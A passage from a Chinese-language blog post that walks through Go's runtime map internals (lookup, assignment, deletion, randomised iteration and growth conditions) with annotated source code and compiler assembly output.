<span class="hljs-comment">// 所以需要先在老的buckets中找</span><br>    <span class="hljs-keyword">if</span> c := h.oldbuckets; c != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">if</span> !h.sameSizeGrow() &#123;<br>            m &gt;&gt;= <span class="hljs-number">1</span><br>        &#125;<br>        oldb := (*bmap)(add(c, (hash&amp;m)*<span class="hljs-type">uintptr</span>(t.bucketsize)))<br>    <span class="hljs-comment">// 如果在oldbuckets中tophash[0]的值，为evacuatedX、evacuatedY，evacuatedEmpty其中之一</span><br>    <span class="hljs-comment">// 则evacuated()返回为true，代表搬迁完成。</span><br>    <span class="hljs-comment">// 因此，只有当搬迁未完成时，才会从此oldbucket中遍历</span><br>        <span class="hljs-keyword">if</span> !evacuated(oldb) &#123;<br>            b = oldb<br>        &#125;<br>    &#125;<br>  <span class="hljs-comment">// 取出当前key值的tophash值</span><br>    top := tophash(hash)<br>  <span class="hljs-comment">// 以下是查找的核心逻辑</span><br>  <span class="hljs-comment">// 双重循环遍历：外层循环是从桶到溢出桶遍历；内层是桶中的cell遍历</span><br>  <span class="hljs-comment">// 跳出循环的条件有三种：第一种是已经找到key值；第二种是当前桶再无溢出桶；</span><br>  <span class="hljs-comment">// 第三种是当前桶中有cell位的tophash值是emptyRest，这个值在前面解释过，它代表此时的桶后面的cell还未利用，所以无需再继续遍历。</span><br>bucketloop:<br>    <span class="hljs-keyword">for</span> ; b != <span class="hljs-literal">nil</span>; b = b.overflow(t) &#123;<br>        <span class="hljs-keyword">for</span> i := <span class="hljs-type">uintptr</span>(<span class="hljs-number">0</span>); i &lt; bucketCnt; i++ &#123;<br>      <span class="hljs-comment">// 判断tophash值是否相等</span><br>            <span class="hljs-keyword">if</span> b.tophash[i] != top &#123;<br>                <span class="hljs-keyword">if</span> b.tophash[i] == emptyRest &#123;<br>                    <span class="hljs-keyword">break</span> bucketloop<br>                &#125;<br>                <span class="hljs-keyword">continue</span><br>      &#125;<br>      <span class="hljs-comment">// 因为在bucket中key是用连续的存储空间存储的，因此可以通过bucket地址+数据偏移量（bmap结构体的大小）+ keysize的大小，得到k的地址</span><br>      <span class="hljs-comment">// 同理，value的地址也是相似的计算方法，只是再要加上8个keysize的内存地址</span><br>            k := add(unsafe.Pointer(b), dataOffset+i*<span class="hljs-type">uintptr</span>(t.keysize))<br>            <span class="hljs-keyword">if</span> t.indirectkey() &#123;<br>                k = *((*unsafe.Pointer)(k))<br>            &#125;<br>      <span class="hljs-comment">// 判断key是否相等</span><br>            <span class="hljs-keyword">if</span> t.key.equal(key, k) &#123;<br>                e := add(unsafe.Pointer(b), dataOffset+bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize)+i*<span class="hljs-type">uintptr</span>(t.elemsize))<br>                <span class="hljs-keyword">if</span> t.indirectelem() &#123;<br>                    e = *((*unsafe.Pointer)(e))<br>                &#125;<br>                <span class="hljs-keyword">return</span> e<br>            &#125;<br>        &#125;<br>    &#125;<br>  <span class="hljs-comment">// 所有的bucket都未找到，则返回零值</span><br>    <span class="hljs-keyword">return</span> unsafe.Pointer(&amp;zeroVal[<span class="hljs-number">0</span>])<br>&#125;<br></code></pre></td></tr></table></figure><p>以下是mapaccess1的查找过程图解</p><p><img src="https://pic1.zhimg.com/80/v2-8547e5fdbc7f51e6d5aec5d51ed658b0_1440w.webp" alt="img"></p><p>map的元素查找，对应go代码有两种形式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 形式一</span><br>    v := m[k]<br>    <span class="hljs-comment">// 形式二</span><br>    v, ok := m[k]<br></code></pre></td></tr></table></figure><p>形式一的代码实现，就是上述的mapaccess1方法。此外，在源码中还有个mapaccess2方法，它的函数签名如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess2</span><span class="hljs-params">(t *maptype, h *hmap, key unsafe.Pointer)</span></span> (unsafe.Pointer, <span class="hljs-type">bool</span>) &#123;&#125;<br></code></pre></td></tr></table></figure><p>与mapaccess1相比，mapaccess2多了一个bool类型的返回值，它代表的是是否在map中找到了对应的key。因为和mapaccess1基本一致，所以详细代码就不再贴出。</p><p>同时，源码中还有mapaccessK方法，它的函数签名如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccessK</span><span class="hljs-params">(t *maptype, h *hmap, key unsafe.Pointer)</span></span> (unsafe.Pointer, unsafe.Pointer) &#123;&#125;<br></code></pre></td></tr></table></figure><p>与mapaccess1相比，mapaccessK同时返回了key和value，其代码逻辑也一致。</p><h3 id="赋值key"><a href="#赋值key" class="headerlink" title="赋值key"></a>赋值key</h3><p>对于写入key的逻辑，其源码实现如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapassign</span><span class="hljs-params">(t *maptype, h *hmap, key unsafe.Pointer)</span></span> unsafe.Pointer &#123;<br>  <span class="hljs-comment">// 如果h是空指针，赋值会引起panic</span><br>  <span class="hljs-comment">// 例如以下语句</span><br>  <span class="hljs-comment">// var m map[string]int</span><br>    <span class="hljs-comment">// m[&quot;k&quot;] = 1</span><br>    <span class="hljs-keyword">if</span> h == <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-built_in">panic</span>(plainError(<span class="hljs-string">&quot;assignment to entry in nil map&quot;</span>))<br>    &#125;<br>  <span class="hljs-comment">// 如果开启了竞态检测 -race</span><br>    <span class="hljs-keyword">if</span> raceenabled &#123;<br>        callerpc := getcallerpc()<br>        pc := funcPC(mapassign)<br>        racewritepc(unsafe.Pointer(h), callerpc, pc)<br>        raceReadObjectPC(t.key, key, callerpc, pc)<br>    &#125;<br>  <span class="hljs-comment">// 如果开启了memory sanitizer -msan</span><br>    <span class="hljs-keyword">if</span> msanenabled &#123;<br>        msanread(key, t.key.size)<br>    &#125;<br>  <span class="hljs-comment">// 有其他goroutine正在往map中写key，会抛出以下错误</span><br>    <span class="hljs-keyword">if</span> h.flags&amp;hashWriting != <span class="hljs-number">0</span> &#123;<br>        throw(<span class="hljs-string">&quot;concurrent map writes&quot;</span>)<br>    &#125;<br>  <span class="hljs-comment">// 通过key和哈希种子，算出对应哈希值</span><br>    hash := t.hasher(key, <span class="hljs-type">uintptr</span>(h.hash0))<br><br>  <span class="hljs-comment">// 将flags的值与hashWriting做按位或运算</span><br>  <span class="hljs-comment">// 因为在当前goroutine可能还未完成key的写入，再次调用t.hasher会发生panic。</span><br>    h.flags ^= hashWriting<br><br>    <span class="hljs-keyword">if</span> h.buckets == <span class="hljs-literal">nil</span> &#123;<br>        h.buckets = newobject(t.bucket) <span class="hljs-comment">// newarray(t.bucket, 1)</span><br>&#125;<br><br>again:<br>  <span class="hljs-comment">// bucketMask返回值是2的B次方减1</span><br>  <span class="hljs-comment">// 因此，通过hash值与bucketMask返回值做按位与操作，返回的在buckets数组中的第几号桶</span><br>    bucket := hash &amp; bucketMask(h.B)<br>  <span class="hljs-comment">// 如果map正在搬迁（即h.oldbuckets != nil）中,则先进行搬迁工作。</span><br>    <span class="hljs-keyword">if</span> h.growing() &#123;<br>        growWork(t, h, bucket)<br>    &#125;<br>  <span class="hljs-comment">// 计算出上面求出的第几号bucket的内存位置</span><br>  <span class="hljs-comment">// post = start + bucketNumber * bucketsize</span><br>    b := (*bmap)(unsafe.Pointer(<span class="hljs-type">uintptr</span>(h.buckets) + bucket*<span class="hljs-type">uintptr</span>(t.bucketsize)))<br>    top := tophash(hash)<br><br>    <span class="hljs-keyword">var</span> inserti *<span class="hljs-type">uint8</span><br>    <span class="hljs-keyword">var</span> insertk unsafe.Pointer<br>    <span class="hljs-keyword">var</span> elem unsafe.Pointer<br>bucketloop:<br>    <span class="hljs-keyword">for</span> &#123;<br>    <span class="hljs-comment">// 遍历桶中的8个cell</span><br>        <span class="hljs-keyword">for</span> i := <span class="hljs-type">uintptr</span>(<span class="hljs-number">0</span>); i &lt; bucketCnt; i++ &#123;<br>      <span class="hljs-comment">// 这里分两种情况，第一种情况是cell位的tophash值和当前tophash值不相等</span><br>      <span class="hljs-comment">// 在 b.tophash[i] != top 的情况下</span><br>      <span class="hljs-comment">// 理论上有可能会是一个空槽位</span><br>      <span class="hljs-comment">// 一般情况下 map 的槽位分布是这样的，e 表示 empty:</span><br>      <span class="hljs-comment">// [h0][h1][h2][h3][h4][e][e][e]</span><br>      <span class="hljs-comment">// 但在执行过 delete 操作时，可能会变成这样:</span><br>      <span class="hljs-comment">// [h0][h1][e][e][h5][e][e][e]</span><br>      <span class="hljs-comment">// 所以如果再插入的话，会尽量往前面的位置插</span><br>      <span class="hljs-comment">// [h0][h1][e][e][h5][e][e][e]</span><br>      <span class="hljs-comment">//          ^</span><br>      <span class="hljs-comment">//          ^</span><br>      <span class="hljs-comment">//       这个位置</span><br>      <span class="hljs-comment">// 所以在循环的时候还要顺便把前面的空位置先记下来</span><br>      <span class="hljs-comment">// 因为有可能在后面会找到相等的key，也可能找不到相等的key</span><br>            <span class="hljs-keyword">if</span> b.tophash[i] != top &#123;<br>        <span class="hljs-comment">// 如果cell位为空，那么就可以在对应位置进行插入</span><br>                <span class="hljs-keyword">if</span> isEmpty(b.tophash[i]) &amp;&amp; inserti == <span class="hljs-literal">nil</span> &#123;<br>                    inserti = &amp;b.tophash[i]<br>                    insertk = add(unsafe.Pointer(b), dataOffset+i*<span class="hljs-type">uintptr</span>(t.keysize))<br>                    elem = add(unsafe.Pointer(b), dataOffset+bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize)+i*<span class="hljs-type">uintptr</span>(t.elemsize))<br>                &#125;<br>                <span class="hljs-keyword">if</span> b.tophash[i] == emptyRest &#123;<br>                    <span class="hljs-keyword">break</span> bucketloop<br>                &#125;<br>                <span class="hljs-keyword">continue</span><br>            &#125;<br>      <span class="hljs-comment">// 第二种情况是cell位的tophash值和当前的tophash值相等</span><br>            k := add(unsafe.Pointer(b), dataOffset+i*<span class="hljs-type">uintptr</span>(t.keysize))<br>            <span class="hljs-keyword">if</span> t.indirectkey() &#123;<br>                k = *((*unsafe.Pointer)(k))<br>            &#125;<br>      <span class="hljs-comment">// 注意，即使当前cell位的tophash值相等，不一定它对应的key也是相等的，所以还要做一个key值判断</span><br>            <span class="hljs-keyword">if</span> !t.key.equal(key, k) &#123;<br>                <span class="hljs-keyword">continue</span><br>            &#125;<br>            <span class="hljs-comment">// 如果已经有该key了，就更新它</span><br>            <span class="hljs-keyword">if</span> t.needkeyupdate() &#123;<br>                typedmemmove(t.key, k, key)<br>            &#125;<br>      <span class="hljs-comment">// 这里获取到了要插入key对应的value的内存地址</span><br>      <span class="hljs-comment">// pos = start + dataOffset + 8*keysize + i*elemsize</span><br>            elem = add(unsafe.Pointer(b), dataOffset+bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize)+i*<span class="hljs-type">uintptr</span>(t.elemsize))<br>      <span class="hljs-comment">// 如果顺利到这，就直接跳到done的结束逻辑中去</span><br>            <span class="hljs-keyword">goto</span> done<br>        &#125;<br>    <span class="hljs-comment">// 如果桶中的8个cell遍历完，还未找到对应的空cell或覆盖cell，那么就进入它的溢出桶中去遍历</span><br>        ovf := b.overflow(t)<br>    <span class="hljs-comment">// 如果连溢出桶中都没有找到合适的cell，跳出循环。</span><br>        <span class="hljs-keyword">if</span> ovf == <span class="hljs-literal">nil</span> &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>        b = ovf<br>    &#125;<br><br>    <span class="hljs-comment">// 在已有的桶和溢出桶中都未找到合适的cell供key写入，那么有可能会触发以下两种情况</span><br>  <span class="hljs-comment">// 情况一：</span><br>  <span class="hljs-comment">// 判断当前map的装载因子是否达到设定的6.5阈值，或者当前map的溢出桶数量是否过多。如果存在这两种情况之一，则进行扩容操作。</span><br>  <span class="hljs-comment">// hashGrow()实际并未完成扩容，对哈希表数据的搬迁（复制）操作是通过growWork()来完成的。</span><br>  <span class="hljs-comment">// 重新跳入again逻辑，在进行完growWork()操作后，再次遍历新的桶。</span><br>    <span class="hljs-keyword">if</span> !h.growing() &amp;&amp; (overLoadFactor(h.count+<span class="hljs-number">1</span>, h.B) || tooManyOverflowBuckets(h.noverflow, h.B)) &#123;<br>        hashGrow(t, h)<br>        <span class="hljs-keyword">goto</span> again <span class="hljs-comment">// Growing the table invalidates everything, so try again</span><br>    &#125;<br><br>  <span class="hljs-comment">// 情况二：</span><br><span class="hljs-comment">// 在不满足情况一的条件下，会为当前桶再新建溢出桶，并将tophash，key插入到新建溢出桶的对应内存的0号位置</span><br>    <span class="hljs-keyword">if</span> inserti == <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-comment">// all current buckets are full, allocate a new one.</span><br>        newb := h.newoverflow(t, b)<br>        inserti = &amp;newb.tophash[<span class="hljs-number">0</span>]<br>        insertk = add(unsafe.Pointer(newb), dataOffset)<br>        elem = add(insertk, bucketCnt*<span class="hljs-type">uintptr</span>(t.keysize))<br>    &#125;<br><br>  <span class="hljs-comment">// 在插入位置存入新的key和value</span><br>    <span class="hljs-keyword">if</span> t.indirectkey() &#123;<br>        kmem := newobject(t.key)<br>        *(*unsafe.Pointer)(insertk) = kmem<br>        insertk = kmem<br>    &#125;<br>    <span class="hljs-keyword">if</span> t.indirectelem() &#123;<br>        vmem := newobject(t.elem)<br>        *(*unsafe.Pointer)(elem) = vmem<br>    &#125;<br>    typedmemmove(t.key, insertk, key)<br>    *inserti = top<br>  <span class="hljs-comment">// map中的key数量+1</span><br>    h.count++<br><br>done:<br>    <span class="hljs-keyword">if</span> h.flags&amp;hashWriting == <span class="hljs-number">0</span> &#123;<br>        throw(<span class="hljs-string">&quot;concurrent map writes&quot;</span>)<br>    &#125;<br>    h.flags &amp;^= hashWriting<br>    <span class="hljs-keyword">if</span> t.indirectelem() &#123;<br>        elem = *((*unsafe.Pointer)(elem))<br>    &#125;<br>    <span class="hljs-keyword">return</span> elem<br>&#125;<br></code></pre></td></tr></table></figure><p>通过对mapassign的代码分析之后，发现该函数并没有将插入key对应的value写入对应的内存，而是返回了value应该插入的内存地址。为了弄清楚value写入内存的操作是发生在什么时候，分析如下map.go代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>        m[i] = <span class="hljs-number">666</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>m[i] &#x3D; 666对应的汇编代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ go tool compile -S map.go<br>...<br>        0x0098 00152 (map.go:6) LEAQ    type.map[int]int(SB), CX<br>        0x009f 00159 (map.go:6) MOVQ    CX, (SP)<br>        0x00a3 00163 (map.go:6) LEAQ    <span class="hljs-string">&quot;&quot;</span>..autotmp_2+184(SP), DX<br>        0x00ab 00171 (map.go:6) MOVQ    DX, 8(SP)<br>        0x00b0 00176 (map.go:6) MOVQ    AX, 16(SP)<br>        0x00b5 00181 (map.go:6) CALL    runtime.mapassign_fast64(SB) // 调用函数runtime.mapassign_fast64，该函数实质就是mapassign（上文示例源代码是该mapassign系列的通用逻辑）<br>        0x00ba 00186 (map.go:6) MOVQ    24(SP), AX 24(SP), AX // 返回值，即 value 应该存放的内存地址<br>        0x00bf 00191 (map.go:6) MOVQ    <span class="hljs-variable">$666</span>, (AX) // 把 666 放入该地址中<br>...<br></code></pre></td></tr></table></figure><p>赋值的最后一步实际上是编译器额外生成的汇编指令来完成的，可见靠 runtime 有些工作是没有做完的。所以，在go中，编译器和 runtime 配合，才能完成一些复杂的工作。同时说明，在平时学习go的源代码实现时，必要时还需要看一些汇编代码。</p><h3 id="删除key"><a href="#删除key" class="headerlink" title="删除key"></a>删除key</h3><p>根据 key 类型的不同，删除操作会被优化成更具体的函数：</p><table><thead><tr><th>key 类型</th><th>删除</th></tr></thead><tbody><tr><td>uint32</td><td>mapdelete_fast32(t *maptype, h *hmap, key uint32)</td></tr><tr><td>uint64</td><td>mapdelete_fast64(t *maptype, h *hmap, key uint64)</td></tr><tr><td>string</td><td>mapdelete_faststr(t *maptype, h *hmap, ky string)</td></tr></tbody></table><p>当然，我们只关心 <code>mapdelete</code> 函数。它首先会检查 h.flags 标志，如果发现写标位是 1，直接 panic，因为这表明有其他协程同时在进行写操作。</p><p>计算 key 的哈希，找到落入的 bucket。检查此 map 如果正在扩容的过程中，直接触发一次搬迁操作。</p><p>删除操作同样是两层循环，核心还是找到 key 的具体位置。寻找过程都是类似的，在 bucket 中挨个 cell 寻找。</p><p>找到对应位置后，对 key 或者 value 进行“清零”操作：</p><p>src&#x2F;runtime&#x2F;map.go的mapdelete方法相关逻辑。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// 对 key 清零</span><br><span class="hljs-keyword">if</span> t.indirectkey &#123;<br>*(*unsafe.Pointer)(k) = <span class="hljs-literal">nil</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>typedmemclr(t.key, k)<br>&#125;<br><br><span class="hljs-comment">// 对 value 清零</span><br><span class="hljs-keyword">if</span> t.indirectvalue &#123;<br>*(*unsafe.Pointer)(v) = <span class="hljs-literal">nil</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>typedmemclr(t.elem, v)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，将 count 值减 1，将对应位置的 tophash 值置成 <code>Empty</code>。</p><h3 id="遍历map"><a href="#遍历map" class="headerlink" title="遍历map"></a>遍历map</h3><p><strong>结论：迭代 map 的结果是无序的</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">m := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">int</span>)<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>        m[i] = i<br>    &#125;<br>    <span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;<br>        fmt.Println(k, v)<br>    &#125;<br></code></pre></td></tr></table></figure><p>运行以上代码，我们会发现每次输出顺序都是不同的。</p><p>map遍历的过程，是按序遍历bucket，同时按需遍历bucket中和其overflow bucket中的cell。但是map在扩容后，会发生key的搬迁，这造成原来落在一个bucket中的key，搬迁后，有可能会落到其他bucket中了，从这个角度看，遍历map的结果就不可能是按照原来的顺序了（详见下文的map扩容内容）。</p><p>但其实，go为了保证遍历map的结果是无序的，做了以下事情：map在遍历时，并不是从固定的0号bucket开始遍历的，每次遍历，都会从一个<strong>随机值序号的bucket</strong>，再从其中<strong>随机的cell</strong>开始遍历。然后再按照桶序遍历下去，直到回到起始桶结束。</p><p><img src="https://pic3.zhimg.com/80/v2-f418d848668c62eac039507d4f460ec2_1440w.webp" alt="img"></p><p>上图的例子，是遍历一个处于未扩容状态的map。如果map正处于扩容状态时，需要先判断当前遍历bucket是否已经完成搬迁，如果数据还在老的bucket，那么就去老bucket中拿数据。</p><p>注意：在下文中会讲解到增量扩容和等量扩容。当发生了增量扩容时，一个老的bucket数据可能会分裂到两个不同的bucket中去，那么此时，如果需要从老的bucket中遍历数据，例如1号，则不能将老1号bucket中的数据全部取出，仅仅只能取出老 1 号 bucket 中那些在裂变之后，分配到新 1 号 bucket 中的那些 key（这个内容，请读者看完下文map扩容的讲解之后再回头理解）。</p><p>详细内容可自行查看源码src&#x2F;runtime&#x2F;map.go的<code>mapiterinit()</code>和<code>mapiternext()</code>方法逻辑。</p><p>这里注释一下<code>mapiterinit()</code>中随机保证的关键代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 生成随机数</span><br>r := <span class="hljs-type">uintptr</span>(fastrand())<br><span class="hljs-keyword">if</span> h.B &gt; <span class="hljs-number">31</span>-bucketCntBits &#123;<br>   r += <span class="hljs-type">uintptr</span>(fastrand()) &lt;&lt; <span class="hljs-number">31</span><br>&#125;<br><span class="hljs-comment">// 决定了从哪个随机的bucket开始</span><br>it.startBucket = r &amp; bucketMask(h.B)<br><span class="hljs-comment">// 决定了每个bucket中随机的cell的位置</span><br>it.offset = <span class="hljs-type">uint8</span>(r &gt;&gt; h.B &amp; (bucketCnt - <span class="hljs-number">1</span>))<br></code></pre></td></tr></table></figure><h3 id="map扩容"><a href="#map扩容" class="headerlink" title="map扩容"></a>map扩容</h3><p>装载因子是决定哈希表是否进行扩容的关键指标。在go的map扩容中，除了<strong>装载因子</strong>会决定是否需要扩容，<strong>溢出桶的数量</strong>也是扩容的另一关键指标。</p><p>为了保证访问效率，当map将要添加、修改或删除key时，都会检查是否需要扩容，扩容实际上是以空间换时间的手段。在之前源码mapassign中，其实已经注释map扩容条件，主要是两点:</p><ol><li>判断已经达到装载因子的临界点，即元素个数 &gt;&#x3D; 桶（bucket）总数 * 6.5，这时候说明大部分的桶可能都快满了（即平均每个桶存储的键值对达到6.5个），如果插入新元素，有大概率需要挂在溢出桶（overflow bucket）上。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">overLoadFactor</span><span class="hljs-params">(count <span class="hljs-type">int</span>, B <span class="hljs-type">uint8</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-keyword">return</span> count &gt; bucketCnt &amp;&amp; <span class="hljs-type">uintptr</span>(count) &gt; loadFactorNum*(bucketShift(B)/loadFactorDen)<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>判断溢出桶是否太多，当桶总数 &lt; 2 ^ 15 时，如果溢出桶总数 &gt;&#x3D; 桶总数，则认为溢出桶过多。当桶总数 &gt;&#x3D; 2 ^ 15 时，直接与 2 ^ 15 比较，当溢出桶总数 &gt;&#x3D; 2 ^ 15 时，即认为溢出桶太多了。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">tooManyOverflowBuckets</span><span class="hljs-params">(noverflow <span class="hljs-type">uint16</span>, B <span class="hljs-type">uint8</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-keyword">if</span> B &gt; <span class="hljs-number">15</span> &#123;<br>        B = <span class="hljs-number">15</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> noverflow &gt;= <span class="hljs-type">uint16</span>(<span class="hljs-number">1</span>)&lt;&lt;(B&amp;<span class="hljs-number">15</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>对于第2点，其实算是对第 1 点的补充。因为在装载因子比较小的情况下，有可能 map 的查找和插入效率也很低，而第 1 点识别不出来这种情况。表面现象就是计算装载因子的分子比较小，即 map 里元素总数少，但是桶数量多（真实分配的桶数量多，包括大量的溢出桶）。</p><p>在某些场景下，比如不断的增删，这样会造成overflow的bucket数量增多，但负载因子又不高，未达不到第 1 点的临界值，就不能触发扩容来缓解这种情况。这样会造成桶的使用率不高，值存储得比较稀疏，查找插入效率会变得非常低，因此有了第 2 点判断指标。这就像是一座空城，房子很多，但是住户很少，都分散了，找起人来很困难。</p><p><img src="https://pic3.zhimg.com/80/v2-33636572ffb353268b2162940514a1ce_1440w.webp" alt="img"></p><p>如上图所示，由于对map的不断增删，以0号bucket为例，该桶链中就造成了大量的稀疏桶。</p><p>两种情况官方采用了不同的解决方案</p><ul><li>针对 1，将 B + 1，新建一个buckets数组，新的buckets大小是原来的2倍，然后旧buckets数据搬迁到新的buckets。该方法我们称之为<strong>增量扩容</strong>。</li><li>针对 2，并不扩大容量，buckets数量维持不变，重新做一遍类似增量扩容的搬迁动作，把松散的键值对重新排列一次，以使bucket的使用率更高，进而保证更快的存取。该方法我们称之为<strong>等量扩容</strong>。</li></ul><p>对于 2 的解决方案，其实存在一个极端的情况：如果插入 map 的 key 哈希都一样，那么它们就会落到同一个 bucket 里，超过 8 个就会产生 overflow bucket，结果也会造成 overflow bucket 数过多。移动元素其实解决不了问题，因为这时整个哈希表已经退化成了一个链表，操作效率变成了 <code>O(n)</code>。但 Go 的每一个 map 都会在初始化阶段的 